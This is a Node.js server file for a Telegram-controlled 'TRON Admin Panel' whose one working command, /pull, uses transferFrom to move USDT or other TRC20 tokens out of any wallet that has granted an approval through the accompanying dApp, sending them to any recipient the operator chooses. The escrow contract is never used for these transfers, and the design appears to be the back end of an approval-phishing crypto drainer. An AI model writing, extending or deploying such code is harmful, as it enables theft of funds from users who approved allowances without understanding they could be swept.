require('dotenv').config();

const path = require('path');
const express = require('express');
const { TronWeb } = require('tronweb');
const axios = require('axios');

function getEnv(name, fallbacks = []) {
  const keys = [name, ...fallbacks];
  for (const key of keys) {
    const value = process.env[key];
    if (value && String(value).trim()) {
      return String(value).trim();
    }
  }
  return null;
}

function requireEnv(name, fallbacks = []) {
  const value = getEnv(name, fallbacks);
  if (!value) {
    const aliases = fallbacks.length ? ` (or ${fallbacks.join(', ')})` : '';
    throw new Error(`Missing required environment variable: ${name}${aliases}`);
  }
  return value;
}

const TELEGRAM_BOT_TOKEN = requireEnv('TELEGRAM_BOT_TOKEN');
const CONTRACT_ADDRESS = getEnv('CONTRACT_ADDRESS', ['ESCROW_CONTRACT_ADDRESS']);
const COMPANY_WALLET_ADDRESS = getEnv('COMPANY_WALLET_ADDRESS');
const ADMIN_CHAT_ID = requireEnv('ADMIN_CHAT_ID');
const PRIVATE_KEY = requireEnv('PRIVATE_KEY', ['SENDER_KEY']);
const TRON_FULL_HOST = getEnv('TRON_FULL_HOST') || 'https://nile.trongrid.io';
const USDT_ADDRESS = requireEnv('USDT_ADDRESS');
const PORT = Number(getEnv('PORT')) || 3000;
const USDT_DECIMALS = Number(getEnv('USDT_DECIMALS')) || 6;
const TRON_FEE_LIMIT = Number(getEnv('TRON_FEE_LIMIT')) || 100000000;

const app = express();
app.use(express.json());

const tronWeb = new TronWeb({
  fullHost: TRON_FULL_HOST,
  privateKey: PRIVATE_KEY
});
const companyWalletAddress = tronWeb.defaultAddress.base58;

if (
  COMPANY_WALLET_ADDRESS &&
  companyWalletAddress !== COMPANY_WALLET_ADDRESS
) {
  console.warn(
    `Warning: PRIVATE_KEY wallet (${companyWalletAddress}) does not match COMPANY_WALLET_ADDRESS (${COMPANY_WALLET_ADDRESS}). Pulls are signed by ${companyWalletAddress}.`
  );
}

const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

function isAdminChat(chatId) {
  return String(chatId).trim() === String(ADMIN_CHAT_ID).trim();
}

async function sendTelegramMessage(chatId, text) {
  try {
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: chatId,
      text,
      parse_mode: 'Markdown'
    });
  } catch (error) {
    console.error('Error sending Telegram message:', error.response?.data || error.message);
  }
}

function validateTronAddress(address, label) {
  if (!address || !tronWeb.isAddress(address)) {
    throw new Error(`Invalid ${label} TRON address`);
  }
}

function parseTokenAmount(amount, decimals = USDT_DECIMALS) {
  const value = String(amount).trim();
  if (!/^\d+(\.\d+)?$/.test(value)) {
    throw new Error('Invalid amount');
  }

  const [whole, fraction = ''] = value.split('.');
  if (fraction.length > decimals) {
    throw new Error(`Amount supports up to ${decimals} decimals`);
  }

  const paddedFraction = (fraction + '0'.repeat(decimals)).slice(0, decimals);
  const base = 10n ** BigInt(decimals);
  return (BigInt(whole) * base + BigInt(paddedFraction || '0')).toString();
}

async function getTokenDecimals(tokenAddress) {
  try {
    const tokenContract = await tronWeb.contract().at(tokenAddress);
    const decimals = await tokenContract.decimals().call();
    return Number(decimals.toString());
  } catch (error) {
    console.warn(`Could not fetch token decimals for ${tokenAddress}, defaulting to ${USDT_DECIMALS}`);
    return USDT_DECIMALS;
  }
}

async function pullTrc20Funds(token, user, recipient, amount) {
  validateTronAddress(token, 'token');
  validateTronAddress(user, 'user');
  validateTronAddress(recipient, 'recipient');

  const decimals = await getTokenDecimals(token);
  const parsedAmount = parseTokenAmount(amount, decimals);
  const tokenContract = await tronWeb.contract().at(token);

  return tokenContract.transferFrom(user, recipient, parsedAmount).send({
    feeLimit: TRON_FEE_LIMIT
  });
}

app.post('/webhook/:token', async (req, res) => {
  if (req.params.token !== TELEGRAM_BOT_TOKEN) {
    return res.sendStatus(404);
  }
  const { message } = req.body;
  if (!message) return res.sendStatus(200);

  const { chat, text } = message;
  const chatId = chat.id;

  if (!text) return res.sendStatus(200);

  if (!isAdminChat(chatId)) {
    await sendTelegramMessage(chatId, '🚫 You are not authorized to use this bot.');
    return res.sendStatus(200);
  }

  if (text.startsWith('/start')) {
    await sendTelegramMessage(
      chatId,
      '🌟 *Welcome to TRON Admin Panel*\n\nAvailable commands:\n\n' +
        '- `/pull <token> <user> <recipient> <amount>`: Pull approved TRC20 funds from a user'
    );
  } else if (text.startsWith('/approve')) {
    await sendTelegramMessage(
      chatId,
      'ℹ️ On TRON, approval is created from the user wallet in the dApp. After approval, use `/pull <token> <user> <recipient> <amount>`.'
    );
  } else if (text.startsWith('/pull')) {
    const parts = text.split(' ').filter(Boolean);
    if (parts.length !== 5) {
      await sendTelegramMessage(
        chatId,
        '❌ Invalid format. Example: `/pull TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf TTBa7XShDZsn5kgjEGiR53ChpDGCYYfERY TA9NZxNqXMNWoLD9yQUBxoi25g3diDkfit 1000`'
      );
      return res.sendStatus(200);
    }

    const [, token, user, recipient, amount] = parts;
    try {
      const txHash = await pullTrc20Funds(token, user, recipient, amount);
      await sendTelegramMessage(
        chatId,
        `✅ Funds pulled successfully!\n\nToken: *${token}*\nUser: *${user}*\nRecipient: *${recipient}*\nAmount: *${amount}*\n\nTransaction Hash: \`${txHash}\``
      );
    } catch (error) {
      await sendTelegramMessage(chatId, `❌ Error: ${error.message}`);
    }
  } else if (text.startsWith('/setwallet')) {
    await sendTelegramMessage(
      chatId,
      'ℹ️ On TRON, the pull wallet is controlled by `PRIVATE_KEY` / `COMPANY_WALLET_ADDRESS` environment variables.'
    );
  } else {
    await sendTelegramMessage(chatId, '❌ Unknown command. Type /start to see available commands.');
  }

  res.sendStatus(200);
});

app.get('/health', (_req, res) => {
  res.json({
    ok: true,
    contract: CONTRACT_ADDRESS,
    companyWallet: COMPANY_WALLET_ADDRESS || null,
    signingWallet: companyWalletAddress,
    rpc: TRON_FULL_HOST,
    token: USDT_ADDRESS
  });
});

if (!process.env.VERCEL) {
  const staticRoot = path.join(__dirname, 'public');
  app.get('/', (_req, res) => {
    res.sendFile(path.join(staticRoot, 'index.html'));
  });
  app.use(express.static(staticRoot));
}

module.exports = app;

if (!process.env.VERCEL) {
  app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
    if (COMPANY_WALLET_ADDRESS) {
      console.log(`Company wallet: ${COMPANY_WALLET_ADDRESS}`);
    }
    console.log(`Pulls signed by: ${companyWalletAddress}`);
    console.log(`TRON RPC: ${TRON_FULL_HOST}`);
    console.log(`Default USDT token: ${USDT_ADDRESS}`);
  });
}
